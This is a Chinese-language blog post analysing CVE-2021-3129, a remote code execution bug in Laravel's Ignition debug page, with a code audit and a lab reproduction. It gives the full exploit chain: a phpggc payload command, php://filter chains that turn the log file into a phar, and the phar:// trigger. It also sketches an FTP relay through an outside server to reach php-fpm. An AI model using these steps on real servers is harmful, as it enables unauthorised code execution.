# CVE-2021-3129 Laravel Debug mode RCE 漏洞分析

阅读量 **358351**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-08 15:30:27

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t013ed06b37d0253505.jpg)

## 0x00 前言

这是笔者第一次撰写漏洞分析的文章，Ignition
个人并没有深入的开发经验，所以有部分可能写得不是那么“入行”，在浏览了许多官方文档粗略了解的情况下，复现并分析了这个漏洞。

总之，如有不当，烦请评论捉虫，我会在第一时间响应并评论提示，谢谢。

## 0x01 简介

Laravel 是基于 MVC 模式的 php 框架，更多框架知识可参考：

[Laravel 框架基础知识总结](https://www.cnblogs.com/yimingwang/p/9781735.html)

[Laravel 5.8 中文文档](https://learnku.com/docs/laravel/5.8)

Ignition 是 Laravel 6 应用程序的默认可自定义的错误页面，它允许在 Flare 上公开分享错误。 如果使用有效的 Flare API
key 进行配置，则会跟踪在应用程序中发生的错误，包括堆栈跟踪。

[Ignition 项目地址](https://github.com/facade/ignition)

[Ignition 官方文档](https://flareapp.io/docs/ignition-for-laravel/installation)

这篇建议阅读，会帮助后续理解：

[Laravel Ignition 功能全解析](https://learnku.com/laravel/t/33857)

####  漏洞成因

在 Debug 模式下，Laravel 内置的 Ignition 功能某些接口未严格过滤输入数据，导致 `file_get_contents()` 和
`file_put_contents()` 函数使用不安全，从而使攻击者能够使用恶意日志文件引起 phar 反序列化攻击，远程执行代码并最终获得服务器权限。

####  影响版本

  * Laravel < 8.4.3
  * Facade Ignition < 2.5.2

####  配置实验环境

<https://github.com/SNCKER/CVE-2021-3129>

具体配置参照项目的食用方法，`generate app key` 刷新显示如下页面即成功。

![](https://p1.ssl.qhimg.com/t01b6880c68cc2bbf77.png)

同时我们还需要一个工具 [phpggc](https://github.com/ambionics/phpggc) 生成 payload：

    
    
    git clone https://github.com/ambionics/phpggc.git
    

## 0x02 复现

以 [Ignition 2.5.1](https://github.com/facade/ignition/releases/tag/2.5.1)
源代码审计。

在功能解析的文章中，我们知道 Igniton 有很多建议的解决方案，这对应着源码中的 `Solutions`：

![](https://p2.ssl.qhimg.com/t0146f95b57467bc599.png)

我们配置环境做的 `generate app key` 也在其中。

漏洞成因出自 `MakeViewVariableOptionalSolution.php` 这个文件过滤不严，举个例子，假如我们使用了一个未知变量：

![](https://p1.ssl.qhimg.com/t0154ea322b8447de1c.png)

可以看到使用了 blade 模板。

Ignition 提出的解决方案便是将 `{{ $name }}` 替换为`{{ $name ?? '' }}` ，这里我们点击 `Make
variable optional` 前抓包：

![](https://p2.ssl.qhimg.com/t0146785ca4d559abe2.png)

post 传递了相应的解决方案类、要替换的变量名以及对应 View 文件路径。

###  代码审计

接下来审计代码，看上述三个参数是否有可利用的地方。

首先我们从 `src/IgnitionServiceProvider.php` 中查找对应路由映射的控制器。

![](https://p4.ssl.qhimg.com/t011176feaade05b2d2.png)

`src/Http/Controllers/ExecuteSolutionController.php` 这是只有单个行为的控制器：

    
    
    class ExecuteSolutionController
    {
        use ValidatesRequests;
    
        public function __invoke(
            ExecuteSolutionRequest $request,
            SolutionProviderRepository $solutionProviderRepository
        ) {
            $solution = $request->getRunnableSolution();
    
            $solution->run($request->get('parameters', []));
    
            return response('');
        }
    }
    

`solution` 决定解决方案类名：

`src/SolutionProviders/SolutionProviderRepository.php` ：

    
    
    public function getSolutionForClass(string $solutionClass): ?Solution
        {
            if (! class_exists($solutionClass)) {
                return null;
            }
    
            if (! in_array(Solution::class, class_implements($solutionClass))) {
                return null;
            }
    
            return app($solutionClass);
        }
    

其确保了我们指向的类实现 `RunnableSolution` 这个接口，这个参数是不能被随意更改的，pass。

而另外的 `parameters` 则会被传到各个方案类中：

![](https://p3.ssl.qhimg.com/t0157542d407a8e2043.png)

我们再来看 `variableName` 和 `viewFile`：

`src/Solutions/MakeViewVariableOptionalSolution.php`：

    
    
    class MakeViewVariableOptionalSolution implements RunnableSolution
    {
        .
        .
        .
    
        public function run(array $parameters = [])
        {
            $output = $this->makeOptional($parameters);
            // 这里写入修改后的文件
            if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
            }
        }
    
        public function makeOptional(array $parameters = [])
        {
            /* 注解 1:
             * 读取 viewFile 文件内容，然后判断 variableName 是否设置并非 NULL(isset)，决定对文件的操作:
             * (1) 已设置，什么都不做。
             * (2) 未设置，就将 '$'.$parameters['variableName'] 替空('')
             */
            $originalContents = file_get_contents($parameters['viewFile']);
            $newContents = str_replace('$'.$parameters['variableName'], 
                                       '$'.$parameters['variableName']." ?? ''", 
                                       $originalContents);
    
            /* 注解 2:
             * 对原始文件内容和修改后的文件内容字符进行了解析，然后使用 Zend 引擎的语法分析器获取源码中的 PHP 语言的解析器代号
             * 等价于分析代码结构
             */
            $originalTokens = token_get_all(Blade::compileString($originalContents));
            $newTokens = token_get_all(Blade::compileString($newContents));
    
            /* 注解 3:
             * 进行了一次“正确”的代码结构分析，如果我们对 variableName 动了些手脚，它可以通过结果对比阻止我们修改文件
             * 当然如果比对正确，修改后的文件将会被写入
             */
            $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);
            if ($expectedTokens !== $newTokens) {
                return false;
            }
    
            return $newContents;
        }
    
        // 正常情况下的 token_get_all() 执行结果生成
        protected function generateExpectedTokens(array $originalTokens, string $variableName): array
        {
            $expectedTokens = [];
            foreach ($originalTokens as $token) {
                $expectedTokens[] = $token;
                if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                    $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                    $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                    $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                    $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
                }
            }
    
            return $expectedTokens;
        }
    }
    

配合代码的三条注解理解，`variableName` 其实等同于加密口令，我们很难绕过这个验证。

而最后一个变量 `viewFile` ，有读写两个操作，且 **没有任何过滤** ：

    
    
    $originalContents = file_get_contents($parameters['viewFile']);
    if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
    }
    

而 `file_get_contents` 通过 `phar://` 伪协议解析 phar 文件时，会将 meta-data
进行反序列化，我们或许可以利用它来 RCE 。

###  漏洞分析

接下来我们从两个问题出发，分析如何去利用这个漏洞。

####  写入什么样的文件？

现在，我们的目的是要找合适的文件写入，之前的情况是使用了未知变量，但因为 `variableName`
修改文件内容前有严格验证，我们并不能利用它，也不能从页面得到任何有效信息，已存在的文件同理。

那么，最后的选项便是日志文件了。

Laravel 使用 [Monolog](https://github.com/Seldaek/monolog)
库为各种强大的日志处理程序提供支持，`config/app.php` 配置文件的 `debug`
选项决定了是否向用户显示错误信息。默认情况下，此选项设置为获取存储在 `.env` 文件中的 `APP_DEBUG` 环境变量的值，默认的 Laravel
日志记录在一个文件 `storage/logs/laravel.log` 。

我们复现的环境本来就是处于 Debug 模式下，本来对于本地开发，应该将 `APP_DEBUG` 环境变量设置为 true 。而在生产环境中，此值应始终保持
false 。如果在生产中将该值设置为 true
，则有可能会将敏感的配置信息暴露给应用程序的最终用户，这也是该漏洞的一大成因。举个例子，我们来尝试加载一个不存在的 View 文件：

![](https://p4.ssl.qhimg.com/t01065c26f913d66b55.png)

再来看实例的 log 文件是否有对应记录：

![](https://p5.ssl.qhimg.com/t0102e1841b4bf41455.png)

成功了，这样我们可以尝试注入精心构造的 payload 通过日志文件获取想要的信息。

####  如何转换文件？

虽能写入日志文件，还是有几个问题需要注意：

我们写入了日志文件后，要怎么让其作为 php 文件解析？

后缀名是不能变的，那么自然而然想到了 phar 来伪造。

phar 文件只要有正确的 stub 即可，它可以理解为一个标志，格式为 `xxx<?php xxx;
__HALT_COMPILER();?>`，前面内容不限，但必须以 `__HALT_COMPILER();?>` 来结尾，否则 phar
扩展将无法识别这个文件为 phar 文件。

我们如何转换 log 文件为 phar ？

用 `php://filter` 在文件返回前更改其内容？

CTFer 应该很熟悉，在读取包含有敏感信息的 php 等源文件时，为了规避特殊字符造成混乱，先将“可能引发冲突的代码”编码一遍，如 b64 ：

    
    
    php://filter/read=convert.base64-encode/resource=xxx.php
    

而 php 在进行 b64 解码时， **不符合 b64 标准的字符将被忽略** ，也就是说仅将合法字符组成密文进行解码，这个特性在绕过“死亡
exit”时经常被用到，解密等同于以下代码：

    
    
    <?php
    $_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
    base64_decode($_GET['txt']);
    

看上去这个方法是可行的，但日志文件并非完全由我们写入的内容组成，还有旧记录，并且我们注入生成的记录会类于以下格式：

    
    
    [2021-02-10 14:35:38] local.ERROR: file_get_contents(snovving): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(snovving): failed to open stream: No such file or directory at /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
    [stacktrace]
    #0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions->handleError(2, 'file_get_conten...', '/src/vendor/fac...', 75, Array)
    #1 /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents('snovving')
    
    ...
    
    #36 /src/server.php(21): require_once('/src/public/ind...')
    #37 {main}
    "}
    

可以看到 payload (snovving)
出现了三次，还有时间前缀和后面大量堆栈跟踪的信息，注入的内容只占其中很小一部分，这意味着返回的内容将是巨量的。

同时还有个非常严重的问题，b64 解码是 4 比特一组，`==` 或 `=` 只会出现在末尾，它们代表最后一组的代码只有 8 位或 16 位，如果 `=`
出现在了中间，因为是 b64 合法字符不会被忽略，也绝大可能不能被正确解码，也就是说，php 将会报错， **这样将不会返回任何结果** 。

综上所述，即使我们利用多次 b64 解码吃掉其他字符，也很大可能出现错误（`=`），并不能精确地转换为 phar
，而且构造上也很繁琐，因为我们在实际测试中，并不知道旧记录，也不知道 `log_max_files` 最大的日志文件数。

**思考到这，既然文本量大，在注入前，我们索性彻底清空 log 文件，这样文件内容就完全是我们 payload 的记录了，届时再来想办法用 b64
吃字符转换，化大为小。**

确定思路后，我们先来观察单个错误记录， 之前我们注意到它出现了三次，但我们现在要关注的是 payload **完整** 出现的地方：

![](https://p2.ssl.qhimg.com/t0109fa5fc576462a84.png)

这里我用了更明显的 payload ，可以看到完整出现的有两处，记录结构也就相当于：

    
    
    [x1]payload[x2]payload[x3]
    

即使加上以前日志记录：

    
    
    [x0]
    [x1]payload[x2]payload[x3]
    

这般，我们清空 log ，也就删除了 `[x0]` 。

**清空 log 文件**

作者提到有一个过滤器（并未被官方文档记录）可以完全清除：

    
    
    php://filter/read=consumed/resource=../storage/logs/laravel.log
    

#####  处理单个错误

虽然单独的 b64 不能清除 `[x1]~[x3]` ，但我们不只有这一个过滤器，况且 `php://filter` 是允许使用多个过滤器的。

处理单个错误的思路，便是把 `[xn]` 这部分内容尽可能变成非 b64 合法字符，最后一次性 b64 解码吃掉，就剩下了我们的 payload ，phar
文件。

[可用过滤器列表](https://www.php.net/manual/zh/filters.php)

由此，我们需要选择方便构造的过滤器，[例如 utf-16 转换为
utf-8](https://www.php.net/manual/en/filters.convert.php) ：

    
    
    <?php
        $fp = fopen('php://output', 'w');
        stream_filter_append($fp, 'convert.iconv.utf-16le.utf-8');
        fwrite($fp, "T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0");
        fclose($fp);
        /* Outputs: This is a test. */
    ?>
    

测试一下：

    
    
    echo -ne '[x1]p\0a\0y\0l\0o\0a\0d\0[x2]p\0a\0y\0l\0o\0a\0d\0[x3]' > /tmp/test.txt
    
    php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
    硛崱payload硛崲payload硛崳
    

这样 `[xn]` 的部分就都变成了非 ascii 字符，接下来就要想办法 **让两处完整 payload 只出现一次** 。

因为 utf-16 使用两个字节，我们可以在后面加一字节，从而使第二处解码错误 ：

    
    
    echo -ne '[x1]p\0a\0y\0l\0o\0a\0d\0X[x2]p\0a\0y\0l\0o\0a\0d\0X[x3]' > /tmp/test.txt
    
    php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
    硛崱payload存㉸灝愀礀氀漀愀搀堀硛崳
    

这样做还有一个好处，因为我们的 payload 不一定像示例一样奇数个能对齐，或许是如 snovving 这样的偶数个字符：

    
    
    echo -ne '[x1]s\0n\0o\0v\0v\0i\0n\0g[x2]s\0n\0o\0v\0v\0i\0n\0g[x3]' > /tmp/test.txt
    
    php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
    硛崱snovvin孧㉸獝渀漀瘀瘀椀渀最硛崳
    

可以看到最后的 g 没有解码成功，但我们加上一字符：

    
    
    echo -ne '[x1]s\0n\0o\0v\0v\0i\0n\0g\0X[x2]s\0n\0o\0v\0v\0i\0n\0g\0X[x3]' > /tmp/test.txt
    
    php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
    硛崱snovving存㉸獝渀漀瘀瘀椀渀最堀硛崳
    

就能 **保证有一处解码是完全正确的** 。

上述都是建立在日志文件本身是两个字节对齐的前提下，但如果不是的话，我们仍会在 `[x1]~[x3]` 解码错误：

    
    
    PHP Warning:  file_get_contents(): iconv stream filter ("utf16le"=>"utf-8"): invalid multibyte sequence in php shell code on line 1
    

所以我们得想办法让这个文件 `[x1]~[x3]` 的部分尽量“均匀”，能无限接近“整除”，这样想就很明确了，两倍。

我们在发送攻击 payload 之前，先随便发送一个无害的，届时日志文件就是这样的构造，保证了两字节：

    
    
    [x1_1]payload1[x1_2]payload1[x1_3]
    [x2_1]payload2[x2_2]payload2[x2_3]
    

最后，便是对空字节的处理，它只有一字节，而 `file_get_contents()` 在加载有空字节的文件时会 warning ：

    
    
    PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1
    

所以我们要对它 **进行填充编码** ，相信有过一定计网知识的会联想到 quoted-printable 这种内容传送编码。

> quoted-printable
>
> 这种编码方法的要点就是对于所有可打印字符的 ascii 码，除特殊字符等号 = 外，都不改变。
>
> = 和不可打印的 ascii 码以及非 ascii 码的数据的编码方法是：
>
> 先将每个字节的二进制代码用两个十六进制数字表示，然后在前面再加上一个等号 = 。
>
> 举例如 = ，它的编码便是 `=3D` ，3D 可对照十六进制 ascii 码表得到。

在清空了 log 文件、传送两个 payload 后，文件中只有两个错误信息记录，也就是说，只有少量的非 ascii
码，用这种编码方式再适合不过，并且，它也有对应的过滤器 `convert.quoted-printable-decode` ：

    
    
    <?php
        $fp = fopen('php://output', 'w');
        stream_filter_append($fp, 'convert.quoted-printable-encode');
        fwrite($fp, "This is a test.\n");
        /* Outputs:  =This is a test.=0A  */
    ?>
    

空字节的编码，自然是 `=00` 。

至此，我们的转换链就能构造了：

    
    
    php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
    

综上，两个问题的提出和解决，攻击思路已经非常明晰了：

  1. 编码构造 payloadb64 -> quoted-printable ，这里构造好后，还要在末尾添加一字符，确保有且只有一处是完整的 payload 。
  2. 清空 log 文件
  3. 发送无害 payload 对齐
  4. 发送攻击 payload
  5. 解码转换 log 至 pharquoted-printable -> utf-16 转 utf-8 -> b64
  6. phar 伪协议执行

###  漏洞利用

编码构造，需要在 phpggc 目录中运行，结果保存在 `payload.txt` 中，记得在末尾添加一个字符，如 `a`
，这里我并未用作者博客中的生成指令，两个 sed 表达式并不能百分百正确 quoted-printable 编码，我参考了作者写的 exp
脚本，quoted-printable 本质上就是将每个字节的十六进制数前加一个 `=` ，所以能得出指令：

    
    
    php -d 'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt
    

清空 log 文件：

    
    
    php://filter/read=consumed/resource=../storage/logs/laravel.log
    

![](https://p1.ssl.qhimg.com/t0181935b25d6f0aaa4.png)

发送无害 payload ：

    
    
    AA
    

![](https://p5.ssl.qhimg.com/t01431f1ddacfaa0fd6.png)

将第一步构造好的 payload 发送（注意末尾的 `a` 是我们前面添加的）：

    
    
    =50=00=44=00=39=00=77=00=61=00=48=00=41...=00=43=00=54=00=55=00=49=00=3D=00a
    

![](https://p0.ssl.qhimg.com/t0104c366c8e7dd1f67.png)

转换文件：

    
    
    php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
    

![](https://p3.ssl.qhimg.com/t0122da6a9dffc1a04a.png)

注意转换文件这步一定要无返回信息，如果有错误，说明前几步根本没到位。

此时的 log 文件一定只有一条完整的 payload ，也就是纯净的 phar 文件：

![](https://p0.ssl.qhimg.com/t012e3eff88e39c35ad.png)

伪协议：

    
    
    phar://../storage/logs/laravel.log/test.txt
    

![](https://p1.ssl.qhimg.com/t017eeada7583d3745a.png)

利用成功。

我们安装的 docker 环境自带有 exp 脚本，github 上也有很多如一键 getshell
的优秀脚本，建议阅读实践，可以参考[这个博客](https://blog.csdn.net/qq_41832837/article/details/113410247?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242)尝试运行，也可以试着自写脚本添加更多链生成的
payload ，增强通杀能力。

###  漏洞拓展

让我更感兴趣的是作者提出的另一个思路：使用 ftp 同 php-fpm 对话。

经过上面的漏洞分析，我们知道我们可以通过 `file_put_contents()` 写入任意数据至 log 文件，然后经
`file_get_contents()` 读回，作者利用这向目标发出 http 请求扫描了通用端口，并发现 php-fpm 在监听端口 9000 。

> php-fpm
>
> php-fastcgi 进程管理器，用于管理 php 进程池的软件，用于接受 web 服务器的请求，它会创建一个主进程，控制何时以及如何将http
> 请求转发给一个或多个子进程处理。
>
> php-fpm 主进程还控制着什么时候创建（处理Web应用更多的流量）和销毁（子进程运行时间太久或不再需要了）PHP子进程。
>
> php-fastcgi 只是一个 cgi 程序，只会解析 php 请求，并且返回结果，不会管理 （因此才出现的 php-fpm）。

综上，也就是说，如果可以向 php-fpm 服务发送任意二进制数据包，就可以在机器上执行代码。这种技术通常与 `gopher://` 协议配合使用，后者由
curl 支持，但 php 不支持。

所以我们需要找到另一个能让我们发送二进制数据包的协议，那就是被动模式下的 ftp ，它可以通过 tcp 连接发送。如果客户机想从 ftp 服务器上读取 /
写入一个文件，ftp 服务器会告诉客户机从某个特定 IP 和端口进行文件操作，IP 和端口并无限制，例如服务器自己的端口。

那么如何使用 ftp 同 php-fpm 对话进行漏洞利用呢？

    
    
    ftp://evil-server.lexfo.fr/file.txt
    

我们使用 ftp 协议的被动模式让 `file_get_contents()` 在我们的服务器上下载一个文件，当它尝试使用
`file_put_contents()` 上传文件时，我们让它将文件发送到 127.0.0.1:9000 ，也就是 php-fpm 。

![](https://p5.ssl.qhimg.com/t01e57aa7a07bcca8d3.png)

图源自原作者博客。

这样就能发送任意二进制数据包，RCE 。

## 0x03 小结

总结一下知识点：

  * phar 反序列化 RCE如果有不了解可以参照这篇文章，非常精简易懂：<https://paper.seebug.org/680/>
  * php://filter 多个过滤器配合妙用这个知识点墙裂推荐阅读 p 神的这篇文章：<https://www.leavesongs.com/PENETRATION/php-filter-magic.html>同时这个原作者也提到过 orange 大神出的 hitcon ctf 2018 One Line PHP Challenge 这道题，也用了过滤器，可以阅读一下 wp 学习。
  * 使用 ftp 同 php-fpm 对话这个可以参考 hxp-2020 的 resonator 这道题。

感谢你能阅读到这，希望我写得足够清晰，能帮助到你理解这个漏洞。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **snovving** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231459](/post/id/231459)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [CVE](/tag/CVE)
  * [双倍活动](/tag/双倍活动)

 **+1** __6赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d65b2fc371a68f8.png) snovving

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

